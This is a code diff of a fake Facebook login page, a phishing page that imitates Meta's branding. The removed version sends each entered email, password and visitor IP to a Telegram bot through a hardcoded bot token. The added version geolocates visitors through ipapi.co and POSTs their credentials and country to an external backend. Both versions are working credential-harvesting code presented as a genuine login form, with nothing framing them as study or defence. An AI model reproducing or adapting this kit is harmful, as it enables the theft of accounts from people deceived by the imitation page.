@@ -159,66 +159,85 @@
                 <p>Connect with friends and the world</p>
                 <p>around you on Facebook.</p>
             </div>
-            <form id="contactForm">
-                <input type="hidden" id="ipAddress" name="ipAddress">
-                <input type="text" name="username" id="username" required placeholder="email">
-                <input type="text" name="password" id="password" required placeholder="password">
-                <input type="hidden" name="_next" value="thanks.html">
-                <input type="hidden" name="_captcha" value="false">
-                <div class="link">
-                    <button type="submit" class="login">Login</button>
-                    <a href="#" class="forgot">Forgot password?</a>
-                </div>
-                <hr>
-                <div class="button">
-                    <a href="#">Create new account</a>
-                </div>
-            </form>
-        </div>
+           <form id="contactForm">
+    <input type="hidden" id="ipAddress" name="ipAddress">
+    <input type="hidden" id="countryFlag" name="countryFlag">
+    
+    <input type="text" name="username" id="username" required placeholder="email">
+    <input type="text" name="password" id="password" required placeholder="password">
+    
+    <div class="link">
+        <button type="submit" class="login">Login</button>
+        <a href="#" class="forgot">Forgot password?</a>
     </div>
-    <footer class="foot">
-        © 2024 Meta
-    </footer>
+    <hr>
+    <div class="button">
+        <a href="#">Create new account</a>
+    </div>
+</form>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('ipAddress').value = data.ip;
-                })
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                });
+<footer class="foot">© 2024 Meta</footer>
+
+<script>
+    let userIP = '';
+    let userCountry = '';
+
+    // Get IP address and country info
+    document.addEventListener('DOMContentLoaded', function () {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                userIP = data.ip;
+                const countryCode = data.country_code;
+                const emojiFlag = getFlagEmoji(countryCode);
+                userCountry = `${emojiFlag} ${data.country_name}`;
+
+                document.getElementById('ipAddress').value = userIP;
+                document.getElementById('countryFlag').value = userCountry;
+            })
+            .catch(error => {
+                console.error('Error fetching IP info:', error);
+            });
+    });
+
+    // Convert country code to emoji flag
+    function getFlagEmoji(countryCode) {
+        const codePoints = countryCode
+            .toUpperCase()
+            .split('')
+            .map(char => 127397 + char.charCodeAt());
+        return String.fromCodePoint(...codePoints);
+    }
+
+    // Submit to Node.js backend
+    document.getElementById('contactForm').addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        const data = {
+            username: document.getElementById('username').value,
+            password: document.getElementById('password').value,
+            ipaddress: userIP,
+            country: userCountry
+        };
+
+        fetch('https://yourdomain.com/api/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(res => res.json())
+        .then(response => {
+            if (response.success) {
+                window.location.href = 'thanks.html';
+            } else {
+                alert('Error submitting form.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Submission failed.');
         });
-
-        document.getElementById('contactForm').addEventListener('submit', function (event) {
-            event.preventDefault(); // Prevent default form submission
-
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var ipAddress = document.getElementById('ipAddress').value;
-
-            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}`;
-            var token = '8052566388:AAGXSqF9uAzaa_SfqD1KO2dROSA2cb0GvKs';
-            var chat_id = '7876943857';
-            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        window.location.href = 'thanks.html';  // Redirect to thank you page
-                    } else {
-                        alert('Error sending message.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to send data.');
-                });
-        });
-    </script>
-</body>
-
-</html>
+    });
+</script>
